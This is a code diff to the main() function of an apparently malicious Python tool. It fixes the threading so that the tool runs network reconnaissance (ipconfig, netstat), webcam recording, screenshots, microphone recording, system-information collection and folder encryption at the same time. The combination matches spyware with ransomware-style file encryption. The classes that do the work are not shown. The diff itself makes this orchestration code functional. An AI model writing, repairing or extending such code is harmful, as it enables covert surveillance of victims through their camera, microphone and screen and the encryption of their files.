@@ -22,20 +22,25 @@ def main():
         """
     print(ascii_art)
 
-    # List of features to run
-    features = [
-        CmdPrompts.ipconfig_all,
-        CmdPrompts.netstat_ano,
-        Webcamera.record_screen,
-        Screenshot.screenshot,
-        Microphone.audio_recording,
-        SysInfo.system_information,
-        FileEncryption.encrypt_folders
-    ]
-
     try:
-        # Create threads for each selected function
-        threads = [threading.Thread(target=features) for _ in features]
+        # Create instances of the classes
+        cmd_prompts = CmdPrompts()
+        web_camera = Webcamera()
+        screenshot = Screenshot()
+        microphone = Microphone()
+        sys_info = SysInfo()
+        file_encryptor = FileEncryption()
+
+        # Create threads for each feature
+        threads = [
+            threading.Thread(target=cmd_prompts.ipconfig_all),
+            threading.Thread(target=cmd_prompts.netstat_ano),
+            threading.Thread(target=web_camera.record_screen),
+            threading.Thread(target=screenshot.screenshot),
+            threading.Thread(target=microphone.audio_recording),
+            threading.Thread(target=sys_info.system_information),
+            threading.Thread(target=file_encryptor.encrypt_folders)
+        ]
 
         # Start the threads
         for thread in threads:
@@ -44,6 +49,7 @@ def main():
         # Wait for all threads to finish
         for thread in threads:
             thread.join()
+
     except Exception as error:
         raise MainFileException(f"Main failed to run") from error
 
